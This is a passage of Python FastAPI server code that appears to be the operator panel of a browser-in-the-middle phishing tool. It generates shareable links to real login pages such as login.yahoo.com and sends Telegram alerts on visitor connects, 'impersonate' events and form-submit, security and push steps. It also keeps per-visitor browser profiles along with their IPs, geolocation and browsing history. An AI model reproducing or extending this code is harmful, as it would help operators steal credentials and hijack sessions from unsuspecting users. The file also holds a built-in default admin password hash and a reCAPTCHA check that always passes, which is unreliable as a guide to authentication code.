            return JSONResponse({"error": "ZIP not found"}, status_code=404)
        
        job = zip_jobs[zip_id]
        
        if job["status"] != "completed":
            return JSONResponse({
                "error": "ZIP not ready",
                "status": job["status"]
            }, status_code=202)
        
        zip_path = Path(job["path"])
        
        if not zip_path.exists():
            return JSONResponse({"error": "ZIP file not found"}, status_code=404)
        
        return FileResponse(
            zip_path,
            filename=job["filename"],
            media_type="application/zip"
        )
    except Exception as e:
        logger.error(f"Error downloading ZIP: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/files/zip/{zip_id}/status")
async def get_zip_status(zip_id: str):
    """Check ZIP creation status"""
    if zip_id not in zip_jobs:
        return JSONResponse({"error": "ZIP not found"}, status_code=404)
    
    return JSONResponse(zip_jobs[zip_id])


# ==============================
# Link Generator Endpoints
# ==============================

@app.get("/api/links/generate")
async def generate_cloudflare_link(target: str, port: int = 80):
    """Generate a Cloudflare tunnel link"""
    try:
        # Cloudflare tunnel command construction
        tunnel_url = f"http://localhost:{port}"
        
        # Return instructions for creating tunnel
        return JSONResponse({
            "target": target,
            "port": port,
            "tunnel_url": tunnel_url,
            "instructions": {
                "step_1": f"Install cloudflared: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/",
                "step_2": f"Run: cloudflared tunnel --url {tunnel_url}",
                "step_3": "Use the URL shown in cloudflared output",
            },
            "command": f"cloudflared tunnel --url {tunnel_url}"
        })
    except Exception as e:
        logger.error(f"Error generating link: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/links/client")
async def generate_client_link(request: Request, target: str = ""):
    """
    Generate a client access link with authentication.
    
    Each link has a unique auth_id that must match for it to work.
    The link is reusable by multiple people and never expires.
    
    Example:
    - Input: target=login.yahoo.com
    - Output: https://server/client.html?auth=abc123xyz&url=login.yahoo.com
    
    The link won't work without valid auth_id.
    """
    try:
        # Clean target URL
        if target:
            clean_target = target
            if clean_target.startswith('http://'):
                clean_target = clean_target[7:]
            elif clean_target.startswith('https://'):
                clean_target = clean_target[8:]
        else:
            clean_target = "https://www.google.com"
        
        # Create authenticated link
        link_data = create_auth_link(clean_target)
        auth_id = link_data["auth_id"]
        
        # Get base URL
        base_url = str(request.base_url).rstrip('/')
        
        # Build final URL with auth_id
        final_url = f"{base_url}/client.html?auth={auth_id}&url={quote(clean_target, safe='')}"
        
        return JSONResponse({
            "link": final_url,
            "auth_id": auth_id,
            "target": clean_target,
            "description": "Share this link with clients. It includes authentication and will navigate to the target URL."
        })
    except Exception as e:
        logger.error(f"Error generating client link: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/links")
async def get_all_links():
    """
    Get all persistent links from storage.
    Returns all generated auth links with their target URLs.
    """
    try:
        # Reload from disk to get latest
        load_persistent_links()
        
        # Convert dict to list format for easier frontend handling
        links_list = []
        for auth_id, data in generated_links.items():
            # Use stored created_at or generate from UUID timestamp
            created_at = data.get("created_at", "")
            if not created_at:
                # Generate date from UUID (first 8 chars of UUID contain timestamp)
                try:
                    uuid_time = int(auth_id[:8], 16)
                    # Convert to datetime (UUID v1 style timestamp)
                    uuid_datetime = datetime.fromtimestamp(uuid_time)
                    created_at = uuid_datetime.isoformat()
                except:
                    # Fallback to current time if UUID parsing fails
                    created_at = datetime.now().isoformat()
            
            links_list.append({
                "auth_id": auth_id,
                "target_url": data.get("target_url", ""),
                "created_at": created_at
            })
        
        # Sort by creation date, newest first
        links_list.sort(key=lambda x: x.get("created_at", ""), reverse=True)
        
        return JSONResponse({
            "success": True,
            "links": links_list,
            "count": len(links_list)
        })
    except Exception as e:
        logger.error(f"Error getting links: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.delete("/api/links/{auth_id}")
async def delete_link(auth_id: str):
    """
    Delete a specific persistent link by auth_id.
    """
    try:
        if auth_id in generated_links:
            del generated_links[auth_id]
            save_persistent_links()
            return JSONResponse({
                "success": True,
                "message": f"Link {auth_id} deleted",
                "auth_id": auth_id
            })
        return JSONResponse({"error": "Link not found"}, status_code=404)
    except Exception as e:
        logger.error(f"Error deleting link: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/api/links/cloudflare")
async def create_cloudflare_tunnel(request: Request):
    """Create a Cloudflare tunnel configuration"""
    try:
        body = await request.json()
        target_port = body.get('port', 80)
        tunnel_name = body.get('name', 'neo-tunnel')
        
        # Generate tunnel configuration
        config = {
            "tunnel_name": tunnel_name,
            "credentials_file": f"/root/.cloudflared/{tunnel_name}.json",
            "config": {
                "tunnel": tunnel_name,
                "credentials-file": f"/root/.cloudflared/{tunnel_name}.json",
                "ingress": [{
                    "service": f"http://localhost:{target_port}"
                }]
            },
            "start_command": f"cloudflared tunnel run {tunnel_name}"
        }
        
        return JSONResponse({
            "success": True,
            "config": config,
            "message": "Use this configuration with cloudflared tunnel"
        })
    except Exception as e:
        logger.error(f"Error creating tunnel config: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/admin/config/telegram")
async def get_telegram_config(request: Request):
    """Get the Telegram configuration that is actually in use.

    Returns the Admin-saved file when it exists, otherwise the config.py /
    environment values.  The panel used to receive an empty object in that
    second case, painted blank fields, and a later "Save" wrote an empty
    token/chat id to disk — which silently switched every notification off.
    """
    # Verify admin authentication
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)

    if telegram_config_loaded and telegram_config:
        effective = dict(telegram_config)
        effective["source"] = "admin"
    else:
        base = _config_tg_defaults()
        effective = {
            "bot_token": base["telegram_bot_token"],
            "chat_id": base["telegram_chat_id"],
            "enabled": base["telegram_enabled"],
            "notify_connect": base["telegram_notify_on_connect"],
            "notify_navigate": base["telegram_notify_on_navigation"],
            "source": "config.py",
        }
    effective["configured"] = bool(effective.get("bot_token") and effective.get("chat_id"))
    return JSONResponse({
        "success": True,
        "config": effective
    })


@app.post("/api/admin/config/telegram")
async def save_telegram_config(request: Request):
    """
    Save Telegram configuration to server
    """
    # Verify admin authentication
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    
    try:
        body = await request.json()
        
        # Update global Telegram config exactly as entered. Values are kept as
        # strings because Telegram accepts numeric IDs, negative group IDs,
        # channel usernames, and other destination forms without a local
        # whitelist or format filter.
        global telegram_config
        bot_token = str(body.get("bot_token") or "").strip()
        chat_id = str(body.get("chat_id") or "").strip()
        enabled_value = body.get("enabled", True)
        if isinstance(enabled_value, str):
            enabled_value = enabled_value.strip().lower() not in {"", "0", "false", "off", "no"}
        telegram_config = {
            "bot_token": bot_token,
            "chat_id": chat_id,
            "enabled": bool(enabled_value),
            "notify_connect": body.get("notify_connect", True),
            "notify_disconnect": body.get("notify_disconnect", True),
            "notify_navigate": body.get("notify_navigate", False),
            "notify_impersonate": body.get("notify_impersonate", False),
            "notify_lpv_workflow": body.get("notify_lpv_workflow", True),
            "notify_lpv_submit": body.get("notify_lpv_submit", True),
            "notify_lpv_security": body.get("notify_lpv_security", True),
            "notify_lpv_final": body.get("notify_lpv_final", True),
            "notify_lpv_push": body.get("notify_lpv_push", True),
            "updated_at": datetime.now().isoformat()
        }
        
        if not bot_token or not chat_id:
            logger.warning(
                "[TELEGRAM] config saved without a %s - notifications will not "
                "be delivered until one is set",
                "bot token" if not bot_token else "chat id",
            )
        # Save to disk before acknowledging the Admin save. A filesystem
        # failure must not look like a successful persistent configuration.
        if not save_telegram_config_to_disk():
            return JSONResponse({
                "success": False,
                "message": "Telegram configuration could not be persisted on the server",
            }, status_code=500)

        # Merge LIVE into the runtime CONFIG: browser-session connect
        # notifications (session_manager), bot polling and every other
        # CONFIG consumer immediately use the admin panel's values too.
        try:
            sync_telegram_config_to_runtime(telegram_config)
            try:
                asyncio.get_running_loop().create_task(_ensure_telegram_polling_started())
            except Exception:
                pass
        except Exception:
            pass

        return JSONResponse({
            "success": True,
            "message": "Telegram configuration saved to server",
            "effective": {
                "enabled": bool(telegram_config.get("enabled")),
                "has_bot_token": bool(telegram_config.get("bot_token")),
                "has_chat_id": bool(telegram_config.get("chat_id")),
            },
        })
        
    except Exception as e:
        logger.error(f"Error saving Telegram config: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/api/admin/config/telegram/test")
async def test_telegram_config(request: Request):
    """
    Test Telegram connection with the configured settings
    """
    # Verify admin authentication
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}

    # Use the values currently in the Admin inputs whenever the fields are
    # present, including an explicitly empty value. This prevents an old
    # saved destination from being substituted for what the operator tested.
    bot_token_raw = body["bot_token"] if "bot_token" in body else telegram_config.get("bot_token", "")
    chat_id_raw = body["chat_id"] if "chat_id" in body else telegram_config.get("chat_id", "")
    bot_token = str(bot_token_raw if bot_token_raw is not None else "").strip()
    chat_id = str(chat_id_raw if chat_id_raw is not None else "").strip()
    if not bot_token or not chat_id:
        return JSONResponse({
            "success": False,
            "message": "Bot token and chat ID are required",
        }, status_code=400)

    # This is deliberately a direct server-side send. It does not use the
    # browser Telegram fallback, a hardcoded destination, or a local allowlist.
    test_message = (
        "✅ <b>Telegram Bot Connected</b>\n\n"
        "This test message was sent by the Fixiis server."
    )
    sent, result = await _telegram_send_message_direct(bot_token, chat_id, test_message)
    if sent:
        return JSONResponse({
            "success": True,
            "message": "Telegram test message sent by the server",
            "telegram": result,
        })

    description = str(result.get("description") or "Telegram rejected the message")
    status_code = int(result.get("status_code") or 502)
    if status_code < 400 or status_code > 599:
        status_code = 502
    return JSONResponse({
        "success": False,
        "message": description,
        "telegram": result,
    }, status_code=status_code)


@app.post("/api/admin/config/telegram/send")
async def send_telegram_admin_message(request: Request):
    """Send an Admin-originated message through the live server config."""
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}
    message = body.get("message", "")
    if not isinstance(message, str) or not message.strip():
        return JSONResponse({
            "success": False,
            "message": "Telegram message is required",
        }, status_code=400)

    if telegram_config_loaded or telegram_config:
        bot_token = telegram_config.get("bot_token", "")
        chat_id = telegram_config.get("chat_id", "")
    else:
        try:
            from config import CONFIG as _C
            bot_token = getattr(_C, "telegram_bot_token", "")
            chat_id = getattr(_C, "telegram_chat_id", "")
        except Exception:
            bot_token = ""
            chat_id = ""

    sent, result = await _telegram_send_message_direct(bot_token, chat_id, message)
    if sent:
        return JSONResponse({
            "success": True,
            "message": "Telegram message sent by the server",
            "telegram": result,
        })
    description = str(result.get("description") or "Telegram rejected the message")
    status_code = int(result.get("status_code") or 502)
    if status_code < 400 or status_code > 599:
        status_code = 502
    return JSONResponse({
        "success": False,
        "message": description,
        "telegram": result,
    }, status_code=status_code)


# ==============================
# Admin Authentication
# ==============================

ADMIN_USERNAME = (os.environ.get('ADMIN_USERNAME') or 'admin').strip()
# Same reasoning: `ADMIN_PASSWORD_HASH=` (blank) in .env must fall back to
# the built-in hash instead of locking the operator out of the panel.
#
# That built-in hash is bcrypt("admin"). It is a convenience for a fresh
# checkout on a private network, not a secret - `python main.py --check`
# says so out loud, and `--set-password` replaces it.
DEFAULT_ADMIN_PASSWORD_HASH = '$2b$12$K9Xm2pQ4rT7vN8wL3jH6e.nSuc39Ma1gWXoznLSkhTeaL9F1CfDne'
ADMIN_PASSWORD_HASH = (os.environ.get('ADMIN_PASSWORD_HASH') or DEFAULT_ADMIN_PASSWORD_HASH).strip()


def _password_hash_source() -> str:
    """Where the admin hash came from, for the log and the login hint."""
    if (os.environ.get('ADMIN_PASSWORD_HASH') or '').strip():
        return 'environment/.env'
    return 'built-in default'


def _hash_problem() -> str:
    """Why the configured hash cannot be used, or '' when it is usable.

    A malformed hash used to fail silently: every login answered "Invalid
    credentials" and the only trace was one error line, so the operator
    retyped a correct password forever. Name it at startup instead.
    """
    value = ADMIN_PASSWORD_HASH
    if value.startswith(('$2a$', '$2b$', '$2y$')):
        if len(value) == 60:
            return ''
        return f'bcrypt hash has {len(value)} characters, expected 60'
    if len(value) == 32 and all(c in '0123456789abcdefABCDEF' for c in value):
        return ''  # legacy MD5, supported
    return 'not a bcrypt hash ($2...) or an MD5 digest'


async def verify_recaptcha(token: str) -> bool:
    """reCAPTCHA verification is currently disabled.

    Previously this called Google's siteverify endpoint with
    ``RECAPTCHA_SECRET_KEY``.  The operator asked to drop reCAPTCHA
    entirely, so the function is now a permanent no-op regardless of
    the secret key.  The signature is kept so the login handler keeps
    compiling; any value (including an empty token) is treated as valid.
    """
    _ = token  # intentionally ignored
    return True


def create_access_token(data: dict, expires_delta: timedelta = None):
    """Create JWT access token"""
    to_encode = data.copy()
    expire = datetime.utcnow() + (expires_delta or timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES))
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)


def verify_jwt_token(token: str) -> dict:
    """Verify and decode JWT token"""
    try:
        payload = jwt.decode(token, JWT_SECRET_KEY, algorithms=[JWT_ALGORITHM])
        return payload
    except jwt.PyJWTError:
        return None


async def verify_admin_token(request: Request) -> bool:
    """Verify admin authentication token from Authorization header"""
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return False
    
    token = auth_header[7:]  # Remove "Bearer " prefix
    payload = verify_jwt_token(token)
    return payload and payload.get("sub") == ADMIN_USERNAME


class AdminAuth:
    """Dependency class for admin authentication"""
    async def __call__(self, request: Request):
        if not await verify_admin_token(request):
            raise HTTPException(status_code=401, detail="Unauthorized")
        return True

admin_auth = AdminAuth()


@app.post("/api/auth/login")
@limiter.limit("5/minute")
async def login(request: Request):
    """Admin login endpoint with JWT authentication.

    reCAPTCHA verification was removed: ``verify_recaptcha`` is now a
    no-op, so we skip the check entirely and just authenticate against
    ``ADMIN_USERNAME`` / ``ADMIN_PASSWORD_HASH``.
    """
    try:
        body = await request.json()
        username = body.get('username', '')
        password = body.get('password', '')
        # ``recaptcha_token`` is ignored but accepted for backwards
        # compatibility with older clients.  No verification is performed.
        _recaptcha_token = body.get('recaptcha_token', '')
        del _recaptcha_token

        # Verify password with bcrypt
        # Support both bcrypt hashes (new) and legacy MD5 (for migration)
        password_valid = False
        hash_error = ''
        stored_hash = ADMIN_PASSWORD_HASH.encode()

        # Check if it's a bcrypt hash (starts with $2a$, $2b$, or $2y$)
        if stored_hash.startswith(b'$2'):
            try:
                password_valid = bcrypt.checkpw(password.encode(), stored_hash)
            except Exception as e:
                # A malformed hash is a configuration mistake, not a crash:
                # answer 401, but say WHY in the log and in the response so
                # the operator stops retyping a correct password.
                hash_error = str(e)
                logger.error(
                    "[Auth] the admin password hash (%s) cannot be used: %s "
                    "- reset it with: python main.py --set-password",
                    _password_hash_source(), e,
                )
                password_valid = False
        else:
            # Legacy MD5 support (deprecated - migrate to bcrypt)
            legacy_hash = hashlib.md5(password.encode()).hexdigest()
            password_valid = (legacy_hash == ADMIN_PASSWORD_HASH)
            if password_valid:
                logger.warning(f"Login with legacy MD5 hash - recommend regenerating ADMIN_PASSWORD_HASH with bcrypt")

        if username == ADMIN_USERNAME and password_valid:
            access_token = create_access_token(data={"sub": username})
            _LOGIN_FAILURES.pop(client_host(request), None)
            logger.info("[Auth] login ok for user %s", username)
            return JSONResponse({
                "success": True,
                "token": access_token,
                "message": "Login successful"
            })

        # One clear line per rejected attempt, naming the actual cause: the
        # log used to say "Failed login attempt" for a wrong username, a
        # wrong password and a broken hash alike.
        host = client_host(request)
        failures = _LOGIN_FAILURES.get(host, 0) + 1
        _LOGIN_FAILURES[host] = failures
        if username != ADMIN_USERNAME:
            reason, message = 'unknown_user', 'Unknown user'
            logger.warning(
                "[Auth] login rejected: no user named %r (the account is %r)",
                username, ADMIN_USERNAME,
            )
        elif hash_error:
            reason = 'hash_unusable'
            message = 'The server\'s admin password is misconfigured'
            logger.warning(
                "[Auth] login rejected for %r: the stored password hash (%s) "
                "is unusable, so no password can match. Reset it with: "
                "python main.py --set-password",
                username, _password_hash_source(),
            )
        else:
            reason, message = 'bad_password', 'Wrong password'
            logger.warning(
                "[Auth] login rejected for %r: wrong password (%d failed "
                "attempt(s) from %s). If it is forgotten, reset it on the "
                "server with: python main.py --set-password",
                username, failures, host,
            )

        hint = ''
        if reason in ('bad_password', 'hash_unusable') and failures >= 2:
            hint = ('On the server, run: python main.py --set-password '
                    '(or --reset-password to go back to admin/admin), then '
                    'restart the app. The panel is reaching the server '
                    'fine - this is only the password.')
        return JSONResponse({
            "success": False,
            "reason": reason,
            "message": f"{message} for '{username}'" if reason == 'bad_password' else message,
            "hint": hint,
            "attempts": failures,
        }, status_code=401)
    except Exception as e:
        logger.error(f"Login error: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/auth/verify")
async def verify_token(request: Request, token: str = Query(...)):
    """Verify admin JWT token"""
    payload = verify_jwt_token(token)
    if payload and payload.get("sub") == ADMIN_USERNAME:
        return JSONResponse({"valid": True})
    return JSONResponse({"valid": False}, status_code=401)


# ==============================
# Profile Management Endpoints
# ==============================

@app.get("/api/profiles")
async def list_profiles():
    """Get list of all profiles with status info"""
    try:
        if not session_manager:
            return JSONResponse({"error": "Session manager not initialized"}, status_code=500)
        
        # Get profiles from profile manager
        if hasattr(session_manager, 'browser_manager') and session_manager.browser_manager:
            profiles = session_manager.browser_manager.profile_manager.get_all_profiles_info()
        else:
            profiles = []
        
        # Merge with active session status
        active_users = set()
        paused_users = set()
        
        if session_manager:
            # Use the manager's locked metadata snapshot; iterating the live
            # dict here raced with reconnect/cleanup mutations.
            for item in await session_manager.get_all_sessions():
                user_id = item.get('user_id') or item.get('profile_id') or item.get('client_id')
                if not user_id:
                    continue
                active_users.add(user_id)
                if item.get('is_sleeping', False):
                    paused_users.add(user_id)
        
        # Update status based on active sessions
        for profile in profiles:
            if profile['user_id'] in active_users:
                if profile['user_id'] in paused_users:
                    profile['status'] = 'paused'
                else:
                    profile['status'] = 'online'
        
        return JSONResponse({
            "profiles": profiles,
            "count": len(profiles),
            "online": len(active_users),
            "paused": len(paused_users)
        })
    except Exception as e:
        logger.error(f"Error listing profiles: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/profiles/{user_id}")
async def get_profile(user_id: str):
    """Get detailed profile information"""
    try:
        if not session_manager:
            return JSONResponse({"error": "Session manager not initialized"}, status_code=500)
        
        profile_manager = getattr(session_manager, 'browser_manager', None)
        if not profile_manager:
            return JSONResponse({"error": "Profile manager not available"}, status_code=500)
        
        if not profile_manager.profile_manager.profile_exists(user_id):
            return JSONResponse({"error": "Profile not found"}, status_code=404)
        profile_path = profile_manager.profile_manager.get_user_profile_path(user_id)
        
        # Get profile info
        meta = profile_manager.profile_manager.get_profile_meta(user_id)
        sites = profile_manager.profile_manager.get_visited_sites(user_id)
        
        # Check if session is active
        session_active = False
        session_status = 'offline'
        if session_manager:
            for item in await session_manager.get_all_sessions():
                if item.get('user_id') == user_id:
                    session_active = True
                    session_status = 'paused' if item.get('is_sleeping', False) else 'online'
                    break
        
        return JSONResponse({
            "user_id": user_id,
            "meta": meta,
            "sites": sites[:50],  # Limit sites
            "session_active": session_active,
            "session_status": session_status,
            "profile_path": str(profile_path)
        })
    except Exception as e:
        logger.error(f"Error getting profile: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/profiles/{user_id}/sites")
async def get_profile_sites(user_id: str):
    """Get list of visited sites for a profile"""
    try:
        if not session_manager:
            return JSONResponse({"error": "Session manager not initialized"}, status_code=500)
        
        profile_manager = getattr(session_manager, 'browser_manager', None)
        if not profile_manager:
            return JSONResponse({"error": "Profile manager not available"}, status_code=500)
        
        sites = profile_manager.profile_manager.get_visited_sites(user_id)
        
        return JSONResponse({
            "user_id": user_id,
            "sites": sites,
            "count": len(sites)
        })
    except Exception as e:
        logger.error(f"Error getting profile sites: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/api/profiles/{user_id}/action")
async def profile_action(user_id: str, request: Request):
    """Perform action on a profile/session"""
    # Verify admin authentication
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    
    try:
        body = await request.json()
        action = body.get('action', '')
        
        if not session_manager:
            return JSONResponse({"error": "Session manager not initialized"}, status_code=500)
        
        # Snapshot through SessionManager; never iterate its live dict while a
        # reconnect/cleanup is mutating it. Profile actions intentionally apply
        # to every runtime tab under this same stable parent.
        sessions = await session_manager.get_session_by_user(user_id)
        profile_manager = getattr(session_manager, 'browser_manager', None)

        if action == 'shutdown':
            await session_manager.shutdown_session(user_id)
            return JSONResponse({"success": True, "action": "shutdown"})

        elif action == 'reload':
            await session_manager.shutdown_session(user_id)
            return JSONResponse({
                "success": True, "action": "reload",
                "message": "Session will be recreated on next connection",
            })

        elif action == 'pause':
            if sessions:
                await session_manager.pause_session(user_id)
                if profile_manager:
                    await profile_manager.profile_manager.update_status(user_id, 'paused')
            return JSONResponse({"success": True, "action": "pause"})

        elif action == 'resume':
            if sessions:
                await session_manager.resume_session(user_id)
                if profile_manager:
                    await profile_manager.profile_manager.update_status(user_id, 'online')
            return JSONResponse({"success": True, "action": "resume"})
        
        else:
            return JSONResponse({"error": f"Unknown action: {action}"}, status_code=400)
            
    except Exception as e:
        logger.error(f"Error performing profile action: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


# ==============================
# Admin Session Locking Endpoints
# Allow admin to lock/unlock sessions for users
# ==============================

@app.post("/api/admin/session/lock/{user_id}")
async def lock_user_session(user_id: str, request: Request):
    """
    Lock a user's session - prevents other browsers from connecting
    """
    # Verify admin authentication
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    
    if not session_manager:
        return JSONResponse({"error": "Session manager not initialized"}, status_code=500)
    
    try:
        # Reserve the explicit Admin lock before taking the session snapshot.
        # This closes the race where a new browser could be created between
        # enumerating existing sessions and applying the lock.
        lock_id = f"admin_lock:{user_id}"
        locked = await session_manager.registry.lock_session(lock_id, user_id)
        if not locked:
            return JSONResponse({
                "error": "Session is already locked by another admin operation"
            }, status_code=409)

        sessions = await session_manager.get_session_by_user(user_id)
        sessions_to_close = [session.session_id for session in sessions]
        await asyncio.gather(
            *(session_manager.remove_session(session_id) for session_id in sessions_to_close),
            return_exceptions=True,
        )

        return JSONResponse({
            "success": True,
            "user_id": user_id,
            "sessions_closed": len(sessions_to_close),
            "message": f"Session locked for user {user_id}"
        })
        
    except Exception as e:
        logger.error(f"Error locking session: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/api/admin/session/unlock/{user_id}")
async def unlock_user_session(user_id: str, request: Request):
    """
    Unlock a user's session - allows new connections
    """
    # Verify admin authentication
    if not await verify_admin_token(request):
        return JSONResponse({"error": "Unauthorized"}, status_code=401)
    
    if not session_manager:
        return JSONResponse({"error": "Session manager not initialized"}, status_code=500)
    
    try:
        # Unlock the session
        unlocked = await session_manager.registry.unlock_session(user_id)
        
        return JSONResponse({
            "success": True,
            "user_id": user_id,
            "was_locked": unlocked,
            "message": f"Session unlocked for user {user_id}" if unlocked else f"Session was not locked for user {user_id}"
        })
        
    except Exception as e:
        logger.error(f"Error unlocking session: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/admin/session/locked")
async def get_locked_sessions():
    """
    Get list of all locked sessions (which users are blocked)
    """
    if not session_manager:
        return JSONResponse({"error": "Session manager not initialized"}, status_code=500)
    
    try:
        locked_sessions = []
        if hasattr(session_manager, 'registry'):
            locked_sessions = await session_manager.registry.get_locked_sessions()
        
        return JSONResponse({
            "locked_sessions": locked_sessions,
            "count": len(locked_sessions)
        })
        
    except Exception as e:
        logger.error(f"Error getting locked sessions: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


# ==============================
# Client Session Reporting Endpoints
# Clients report session events, server stores them centrally
# Admin receives real-time updates via WebSocket
# ==============================

@app.post("/api/client/session")
async def report_client_session(request: Request):
    """
    Client reports session event (connect, disconnect, page_change)
    Server stores this and broadcasts to all connected admin WebSockets
    """
    try:
        body = await request.json()
        event_type = body.get('event_type', '')  # 'connect', 'disconnect', 'page_change', 'heartbeat'
        client_id = body.get('client_id', '')
        user_id = body.get('user_id', '')
        url = body.get('url', '')
        
        if not client_id:
            return JSONResponse({"error": "client_id required"}, status_code=400)
        # client_id is the runtime session key; user_id is the stable parent
        # grouping key. Do not collapse concurrent tabs into one record.
        client_id = str(client_id)
        user_id = str(user_id or client_id)
        
        # Load existing or create new session
        await load_server_sessions()
        now = datetime.now().isoformat()
        
        # Get client IP and user info — server-side geo is authoritative:
        # resolve the real IP (proxy headers), geolocate it ourselves, and
        # only fall back to whatever the client reported when lookup fails.
        client_ip = request.client.host if request.client else 'Unknown'
        try:
            client_ip = resolve_client_ip_from_headers(request.headers, client_ip)
        except Exception:
            pass
        try:
            _geo = await server_geolocate(client_ip)
        except Exception:
            _geo = None
        user_agent = body.get('user_agent', '')
        country = (_geo or {}).get("country") or body.get('country', '')
        state = (_geo or {}).get("state") or body.get('state', '')
        city = (_geo or {}).get("city") or body.get('city', '')
        zip_code = (_geo or {}).get("zip") or body.get('zip', '')
        
        # Mutate, snapshot, persist, and order concurrent reports under one
        # registry lock.  In particular, two page_change/heartbeat requests
        # for different clients must not serialize through a stale unlocked
        # read or overwrite one another on disk.
        async with server_sessions_lock:
            if event_type == 'connect':
                if client_id not in server_sessions:
                    server_sessions[client_id] = {
                        "client_id": client_id,
                        "user_id": user_id or client_id or 'Unknown',
                        "parent_client_id": user_id or client_id,
                        "first_seen": now,
                        "last_seen": now,
                        "last_url": url,
                        "history": [],
                        "total_uptime_seconds": 0,
                        "is_online": True,
                        "gpu_id": body.get('gpu_id', 0),
                        "ip_address": client_ip,
                        "user_agent": user_agent,
                        "country": country,
                        "state": state,
                        "city": city,
                        "zip": zip_code,
                    }
                    if url:
                        server_sessions[client_id]["history"].append({
                            "url": url,
                            "timestamp": now,
                            "duration_seconds": 0,
                        })
                else:
                    stored = server_sessions[client_id]
                    stored["is_online"] = True
                    stored["last_seen"] = now
                    stored["user_id"] = user_id or stored.get("user_id", client_id)
                    stored["parent_client_id"] = user_id or stored.get("parent_client_id", client_id)
                    stored["gpu_id"] = body.get('gpu_id', stored.get('gpu_id', 0))
                    stored["ip_address"] = client_ip
                    stored["user_agent"] = user_agent
                    stored["country"] = country
                    stored["state"] = state
                    stored["city"] = city
                    stored["zip"] = zip_code

            elif event_type == 'page_change':
                stored = server_sessions.get(client_id)
                if isinstance(stored, dict):
                    history = stored.setdefault("history", [])
                    if history:
                        try:
                            history[-1]["duration_seconds"] = (
                                datetime.now() - datetime.fromisoformat(history[-1]["timestamp"])
                            ).total_seconds()
                        except Exception:
                            pass
                    if url:
                        history.append({
                            "url": url,
                            "timestamp": now,
                            "duration_seconds": 0,
                        })
                        stored["last_url"] = url
                        stored["current_url"] = url
                        if len(history) > 100:
                            stored["history"] = history[-100:]

            elif event_type == 'heartbeat':
                stored = server_sessions.get(client_id)
                if isinstance(stored, dict):
                    stored["last_seen"] = now
                    stored["is_online"] = True

            elif event_type == 'disconnect':
                stored = server_sessions.get(client_id)
                if isinstance(stored, dict):
                    history = stored.setdefault("history", [])
                    if history:
                        try:
                            history[-1]["duration_seconds"] = (
                                datetime.now() - datetime.fromisoformat(history[-1]["timestamp"])
                            ).total_seconds()
                        except Exception:
                            pass
                    stored["is_online"] = False
                    stored["last_seen"] = now

            stored_now = server_sessions.get(client_id)
            snapshot = copy.deepcopy(stored_now) if isinstance(stored_now, dict) else None
            success = await _save_server_sessions_locked()

        if success and snapshot is not None:
            await broadcast_session_update(client_id, snapshot)

        return JSONResponse({
            "success": True,
            "event_type": event_type,
            "client_id": client_id
        })

    except Exception as e:
        logger.error(f"Error reporting client session: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/api/client/session/disconnect")
async def disconnect_previous_client_session(request: Request):
    """Release the active public runtime before a client opens a new one.

    The browser calls this once during page bootstrap, before opening its new
    WebSocket.  It deliberately does not exclude the runtime id supplied by
    the page: a refresh can reuse that id while the previous WebSocket is
    still alive, and that old owner must be closed before admission.  A
    reconnect made by the same page does not call this endpoint; it reattaches
    through the normal WebSocket path instead.
    """
    try:
        body = await request.json()
    except Exception:
        body = {}

    if not isinstance(body, dict):
        body = {}
    requested_parent = str(
        body.get("user_id") or body.get("parent_client_id") or ""
    ).strip()
    runtime_id = str(body.get("session_id") or body.get("client_id") or "").strip()

    # A client normally sends the durable user id.  The runtime fallback keeps
    # the endpoint useful for a browser that has not received session_info yet.
    if not requested_parent and runtime_id and session_manager:
        try:
            existing = await session_manager.get_session(runtime_id)
            requested_parent = str(getattr(existing, "user_id", "") or "").strip()
        except Exception:
            requested_parent = ""
    if not requested_parent:
        return JSONResponse({"error": "user_id required"}, status_code=400)

    parent_id = requested_parent
    if session_manager:
        try:
            parent_id = map_user_id_to_existing_folder(parent_id, session_manager)
        except Exception:
            pass

    try:
        locked_by = None
        if session_manager:
            try:
                locked_by = await session_manager.registry.get_locked_session_id(parent_id)
            except Exception:
                locked_by = None
        if locked_by:
            return JSONResponse({
                "success": False,
                "locked": True,
                "locked_session_id": locked_by,
                "parent_client_id": parent_id,
            }, status_code=423)

        # No exclude_session_id is intentional.  This endpoint is the explicit
        # pre-connect handoff, including same-id page refreshes.
        replaced = await _replace_lpv_parent_connection(
            parent_id,
            exclude_client_id=None,
            exclude_websocket=None,
        )

        # Keep the durable Admin/profile record from waiting for the old client
        # to report its close.  A replacement generation will immediately write
        # it online again after the new WebSocket is admitted. Do not write an
